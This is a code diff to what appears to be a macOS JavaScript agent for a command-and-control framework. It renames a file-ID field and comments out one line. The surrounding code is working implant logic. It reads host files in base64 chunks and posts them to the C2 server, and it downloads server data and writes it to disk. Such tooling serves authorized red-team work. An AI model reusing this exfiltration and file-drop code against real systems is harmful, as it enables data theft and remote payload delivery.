@@ -110,14 +110,13 @@ class customC2 extends baseC2{
             var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
             var registerData = convert_to_nsdata(registerData);
             var registerFile = this.postResponse(task, registerData);
-            //console.log("did the call to postresponse");
             if (registerFile['status'] == "success"){
                 handle.seekToFileOffset(0);
                 var currentChunk = 1;
                 var data = handle.readDataOfLength(chunkSize);
                 while(parseInt(data.length) > 0 && offset < fileSize){
                     // send a chunk
-                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
+                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                     fileData = convert_to_nsdata(fileData);
                     this.postResponse(task, fileData);
                     $.NSThread.sleepForTimeInterval(this.interval);
@@ -128,8 +127,8 @@ class customC2 extends baseC2{
                     currentChunk += 1;
                     data = handle.readDataOfLength(chunkSize);
                 }
-                var output = "Finished downloading file with id: " + registerFile['id'];
-                output += "\nBrowse to /api/v1.0/files/" + registerFile['id'];
+                var output = "Finished downloading file with id: " + registerFile['file_id'];
+                output += "\nBrowse to /api/v1.0/files/" + registerFile['file_id'];
             }
             else{
                var output = "Failed to register file to download";
@@ -147,8 +146,8 @@ class customC2 extends baseC2{
             var file_data = this.htmlGetData(this.baseurl + url);
             var file_path = split_params.slice(1, ).join(" ");
             var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
-            var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
-            output = write_data_to_file(decoded_data, file_path);
+            //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
+            var output = write_data_to_file(decoded_data, file_path);
             return output;
 	    }catch(error){
 	        return error.toString();
